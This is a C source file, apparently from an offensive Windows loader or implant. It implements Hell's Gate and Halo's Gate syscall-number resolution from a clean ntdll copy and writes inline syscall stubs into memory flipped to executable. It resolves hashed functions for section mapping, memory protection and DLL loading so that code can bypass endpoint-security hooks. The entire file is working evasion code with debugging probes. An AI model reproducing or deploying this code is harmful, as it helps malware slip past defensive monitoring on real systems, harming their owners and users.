#include "Common.h"
#include "Constexpr.h"
#include "Dbg.h"

//
// Read the SSN from a clean ntdll stub prologue.
//
FUNC DWORD NaxHellsGate(
    _In_ PBYTE Stub ) {

    if ( !Stub ) return NAX_SC_SSN_INVALID;
    if ( Stub[0] != NAX_NT_PROLOGUE_0 || Stub[1] != NAX_NT_PROLOGUE_1 ||
         Stub[2] != NAX_NT_PROLOGUE_2 || Stub[3] != NAX_NT_PROLOGUE_3 )
        return NAX_SC_SSN_INVALID;

    return *(DWORD*)( Stub + NAX_NT_OFF_SSN );
}

//
// If the target stub is hooked, derive its SSN from a clean neighbor.
// Assumes SSNs are sequential in ntdll export name order.
//
FUNC DWORD NaxHalosGate(
    _In_ PVOID CleanNtdll,
    _In_ ULONG TargetHash ) {

    PBYTE b = B_PTR( CleanNtdll );
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( b + dos->e_lfanew );

    DWORD expRva = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    if ( !expRva ) return NAX_SC_SSN_INVALID;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)( b + expRva );
    PDWORD names = (PDWORD)( b + exp->AddressOfNames );
    PWORD  ords  = (PWORD)(  b + exp->AddressOfNameOrdinals );
    PDWORD funcs = (PDWORD)( b + exp->AddressOfFunctions );
    DWORD  n     = exp->NumberOfNames;

    DWORD tgt = n;
    for ( DWORD i = 0; i < n; i++ ) {
        if ( HashString( (PCHAR)( b + names[i] ), 0 ) == TargetHash ) {
            tgt = i;
            break;
        }
    }
    if ( tgt == n ) return NAX_SC_SSN_INVALID;

    for ( DWORD d = 1; d < 256; d++ ) {
        for ( INT dir = -1; dir <= 1; dir += 2 ) {
            if ( dir < 0 && tgt < d ) continue;
            if ( dir > 0 && tgt + d >= n ) continue;

            DWORD idx   = ( dir < 0 ) ? ( tgt - d ) : ( tgt + d );
            PBYTE nstub = b + funcs[ ords[ idx ] ];
            DWORD nssn  = NaxHellsGate( nstub );
            if ( nssn == NAX_SC_SSN_INVALID ) continue;

            INT32 delta = (INT32)tgt - (INT32)idx;
            INT32 ssn   = (INT32)nssn + delta;
            if ( ssn < 0 || ssn > 0x2000 ) return NAX_SC_SSN_INVALID;
            return (DWORD)ssn;
        }
    }

    return NAX_SC_SSN_INVALID;
}

//
// Resolve one syscall by hash against the clean ntdll copy and build an
// indirect syscall stub in the provided buffer.
//
FUNC BOOL NaxScResolve(
    _In_  PINSTANCE     Inst,
    _In_  ULONG         Hash,
    _Out_ PNAX_SYSCALL  Out ) {

    PBYTE clean = B_PTR( Inst->Modules.CleanNtdll );
    if ( !clean ) return FALSE;

    PBYTE realStub = B_PTR( LdrFunction( clean, Hash ) );
    if ( !realStub ) return FALSE;

    DWORD ssn = NaxHellsGate( realStub );
    if ( ssn == NAX_SC_SSN_INVALID ) ssn = NaxHalosGate( clean, Hash );
    if ( ssn == NAX_SC_SSN_INVALID ) return FALSE;

    if ( !Out->Stub ) return FALSE;

    // Inline indirect syscall stub, byte-shaped like the stock ntdll
    // prologue (the same layout HellsGate reads from the clean copy):
    //   mov r10, rcx      ; 4c 8b d1
    //   mov eax, ssn      ; b8 dd dd dd dd
    //   syscall           ; 0f 05   (RCX <- ret addr, R11 <- flags)
    //   ret               ; c3      (unwinds to the stub's caller)
    //
    // The earlier design jmp'd to a `syscall; ret` gadget inside ntdll.
    // The VM probe matrix killed that: ntdll .text executes (a1.2-dst), the
    // clean map executes (a1.2-cst — its own NtClose prologue ran end to
    // end), so the unshared link — the jmp-r11 dispatch across pages — was
    // the failing element.  That same cst probe proves a syscall from a
    // non-image page works, so the stub carries the syscall inline; no
    // gadget scan, no cross-page dispatch.
    PBYTE s = B_PTR( Out->Stub );
    s[0]  = 0x4c; s[1]  = 0x8b; s[2]  = 0xd1;                       // mov r10, rcx
    s[3]  = 0xb8;
    *(DWORD*)(s + 4) = ssn;                                         // mov eax, ssn
    s[8]  = 0x0f; s[9]  = 0x05;                                     // syscall
    s[10] = 0xc3;                                                   // ret
    for ( int i = 11; i < NAX_SC_STUB_SIZE; i++ ) s[i] = 0x90;       // nop padding

    Out->Ssn    = ssn;
    Out->Gadget = NULL;

    return TRUE;
}

//
// Allocate indirect syscall stubs from the heap and resolve the core syscalls.
//
FUNC BOOL NaxScInit(
    _In_ PINSTANCE Inst ) {

    if ( !Inst->Modules.CleanNtdll ) return FALSE;

    // Dedicated page for the stubs — NOT the shared process heap.  VP'ing a
    // heap page to RX strands every other heap tenant on it (the loader
    // INSTANCE, free-list bookkeeping); the first post-flip write faulted
    // exactly there.  A private allocation has no neighbours to strand.
    SIZE_T stubSize = NAX_SC_STUB_SIZE * NAX_SC_MAX;
    PVOID stubBase = Inst->Win32.VirtualAlloc(
            NULL, stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !stubBase ) return FALSE;

    // Stubs are written to RW memory first, then flipped to RX.
    ULONG old = 0;
    SIZE_T sz = stubSize;

    NAX_SYSCALL* table = &Inst->Syscalls.NtOpenSection;
    ULONG hashes[] = {
        HASH_STR("NtOpenSection"),
        HASH_STR("NtMapViewOfSection"),
        HASH_STR("NtUnmapViewOfSection"),
        HASH_STR("NtAllocateVirtualMemory"),
        HASH_STR("NtProtectVirtualMemory"),
        HASH_STR("NtQuerySystemInformation"),
        HASH_STR("NtClose"),
        HASH_STR("LdrLoadDll"),
    };

    UINT32 count = sizeof(hashes) / sizeof(hashes[0]);
    if ( count > NAX_SC_MAX ) count = NAX_SC_MAX;

    for ( UINT32 i = 0; i < count; i++ ) {
        table[i].Stub = B_PTR( stubBase ) + i * NAX_SC_STUB_SIZE;
        if ( !NaxScResolve( Inst, hashes[i], &table[i] ) ) {
            // degrade: leave this slot as NULL, caller must fall back
            table[i].Stub = NULL;
        }
    }

#ifdef NAX_DEBUG
    // Bare `ret` in the LdrLoadDll slot (unused in mode-0) — the Main.c
    // page-exec probe calls it after the RX flip; a return from here proves
    // the stub page fetches and executes, with no syscall involved.
    // Must be written while the page is still RW.
    if ( table[7].Stub ) B_PTR( table[7].Stub )[0] = 0xC3;
#endif

    // Flip stubs to RX
    sz = stubSize;
    NTSTATUS vx = Inst->Win32.NtProtectVirtualMemory( NtCurrentProcess(), &stubBase, &sz, PAGE_EXECUTE_READ, &old );

    /* debug ladder: the two slots mode-0 execution touches first */
    NAXDBGX( Inst->Modules.Kernel32, "sx-stbase=", stubBase );
    NAXDBGX( Inst->Modules.Kernel32, "sx-oldp=",  old );
    NAXDBGX( Inst->Modules.Kernel32, "sx-stub3=", table[3].Stub );
    NAXDBGX( Inst->Modules.Kernel32, "sx-ssn3=",  table[3].Ssn );
    NAXDBGX( Inst->Modules.Kernel32, "sx-gdg3=",  table[3].Gadget );
    NAXDBGX( Inst->Modules.Kernel32, "sx-gdgby=", table[3].Gadget ? *(UINT64*)table[3].Gadget : 0 );
    NAXDBGX( Inst->Modules.Kernel32, "sx-enc3a=", table[3].Stub ? *(UINT64*)table[3].Stub : 0 );
    NAXDBGX( Inst->Modules.Kernel32, "sx-enc3b=", table[3].Stub ? *(UINT64*)( (PBYTE)table[3].Stub + 8 ) : 0 );
    NAXDBGX( Inst->Modules.Kernel32, "sx-enc3c=", table[3].Stub ? *(UINT64*)( (PBYTE)table[3].Stub + 16 ) : 0 );
    NAXDBGX( Inst->Modules.Kernel32, "sx-stub4=", table[4].Stub );
    NAXDBGX( Inst->Modules.Kernel32, "sx-ssn4=",  table[4].Ssn );
    NAXDBGX( Inst->Modules.Kernel32, "sx-vprx=",  vx );
    NAXDBGX( Inst->Modules.Kernel32, "sx-clean=", Inst->Modules.CleanNtdll );

    return TRUE;
}
